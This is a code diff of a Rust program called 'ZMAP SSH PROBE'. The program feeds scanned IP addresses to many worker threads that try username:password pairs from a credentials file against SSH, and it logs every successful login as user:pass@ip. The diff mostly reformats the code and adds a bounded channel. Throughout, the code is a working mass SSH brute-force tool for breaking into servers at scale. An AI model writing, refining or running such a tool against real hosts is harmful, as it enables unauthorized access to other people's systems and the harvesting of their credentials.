@@ -1,15 +1,15 @@
-use ssh2::Session;
-use std::io::{self, BufRead, Write, BufWriter};
-use std::fs::OpenOptions;
-use std::net;
-use std::sync::mpsc;
-use std::time::Duration;
-use std::sync::atomic::{AtomicUsize, Ordering};
-use colored::*; 
 use clap::Parser;
+use colored::*;
+use ssh2::Session;
+use std::fs::OpenOptions;
 use std::io::Read;
-use std::thread;
+use std::io::{self, BufRead, BufWriter, Write};
+use std::net;
+use std::sync::atomic::{AtomicUsize, Ordering};
+use std::sync::mpsc;
 use std::sync::{Arc, Mutex};
+use std::thread;
+use std::time::Duration;
 
 static IMPORTED: AtomicUsize = AtomicUsize::new(0);
 static CHECKED: AtomicUsize = AtomicUsize::new(0);
@@ -17,6 +17,7 @@ static COMBOS_CHECKED: AtomicUsize = AtomicUsize::new(0);
 static SUCCESS: AtomicUsize = AtomicUsize::new(0);
 static FAILED: AtomicUsize = AtomicUsize::new(0);
 static TIMEOUTS: AtomicUsize = AtomicUsize::new(0);
+const CHANNEL_SIZE: usize = 50000;
 
 #[derive(Parser, Debug)]
 #[command(author, version, about, long_about = None)]
@@ -37,14 +38,14 @@ struct Args {
 fn main() {
     let args = Args::parse();
 
-    let (ip_tx, ip_rx) = mpsc::channel();
+    let (ip_tx, ip_rx) = mpsc::sync_channel(CHANNEL_SIZE);
     let ip_rx = Arc::new(Mutex::new(ip_rx));
-       
+
     thread::spawn(|| {
         println!("+-------------------------------------------+");
         println!("|             ZMAP SSH PROBE                |");
         println!("+-------------------------------------------+");
-        
+
         loop {
             thread::sleep(Duration::new(1, 0)); // Sleep for one second
 
@@ -59,7 +60,7 @@ fn main() {
             print!("IPs Imported: {} | IPs Checked: {} | Combos Checked: {} | Successful: {} | Failed: {} | Timeouts: {} \n", 
                 imported_count.to_string().blue(),
                 checked_count.to_string().blue(),
-                combos_checked_count.to_string().yellow(), 
+                combos_checked_count.to_string().yellow(),
                 success_count.to_string().green(),
                 failed_count.to_string().red(),
                 timeouts_count.to_string().magenta()
@@ -76,37 +77,46 @@ fn main() {
             ip_tx.send(ip).unwrap();
             IMPORTED.fetch_add(1, Ordering::Relaxed);
         }
+        drop(ip_tx)
     });
 
     let credentials = load_credentials_file("credentials.txt");
-    const STACK_SIZE: usize = 8 * 1024 * 1024; // 8MB
+    const STACK_SIZE: usize = 6 * 1024 * 1024; // 6MB
 
-    let handles: Vec<_> = (0..args.threads).map(|_| {
-        let ip_rx = Arc::clone(&ip_rx);
-        let creds = credentials.clone();
-        let output_file = args.output_file.clone();
-    
-        std::thread::Builder::new().stack_size(STACK_SIZE).spawn(move || {
-            loop {
-                let ip;
-                {
-                    let receiver = ip_rx.lock().unwrap();
-                    ip = receiver.recv();
-                }
-    
-                match ip {
-                    Ok(ip) => check_ssh_login(ip, args.port, creds.clone(), &output_file),
-                    Err(_) => break, // Break loop when no more IPs
-                }
-            }
-        }).unwrap()
-    }).collect();
+    let handles: Vec<_> = (0..args.threads)
+        .map(|_| {
+            let ip_rx = Arc::clone(&ip_rx);
+            let creds = credentials.clone();
+            let output_file = args.output_file.clone();
+
+            std::thread::Builder::new()
+                .stack_size(STACK_SIZE)
+                .spawn(move || {
+                    loop {
+                        let received_ip;
+                        {
+                            let receiver = ip_rx.lock().unwrap();
+                            received_ip = receiver.recv();
+                        }
+
+                        match received_ip {
+                            Ok(ip) => {
+                                check_ssh_login(ip, args.port, creds.clone(), &output_file);
+                            }
+                            Err(_) => break, // Break loop when no more IPs
+                        }
+                    }
+                })
+                .unwrap()
+        })
+        .collect();
 
     // Wait for all threads to finish
     for handle in handles {
         handle.join().unwrap();
     }
 }
+
 
 fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, output_file: &str) {
     let timeout = 5_000; // milliseconds
@@ -192,15 +202,18 @@ fn load_credentials_file(file_path: &str) -> Vec<(String, String)> {
     let file = std::fs::File::open(file_path).expect("Unable to open credentials file");
     let reader = std::io::BufReader::new(file);
 
-    reader.lines().filter_map(|line| {
-        let line = line.expect("Failed to read line from credentials file");
-        let parts: Vec<&str> = line.split(':').collect();
-        if parts.len() == 2 {
-            Some((parts[0].to_string(), parts[1].to_string()))
-        } else {
-            None
-        }
-    }).collect()
+    reader
+        .lines()
+        .filter_map(|line| {
+            let line = line.expect("Failed to read line from credentials file");
+            let parts: Vec<&str> = line.split(':').collect();
+            if parts.len() == 2 {
+                Some((parts[0].to_string(), parts[1].to_string()))
+            } else {
+                None
+            }
+        })
+        .collect()
 }
 
 fn write_successful_login_to_file(output_file: &str, ip: &str, username: &str, password: &str) {
@@ -211,7 +224,7 @@ fn write_successful_login_to_file(output_file: &str, ip: &str, username: &str, p
         .open(output_file)
         .unwrap();
     let mut file = BufWriter::new(file);
-    
+
     writeln!(file, "{}:{}@{}", username, password, ip).unwrap();
     file.flush().unwrap();
 }
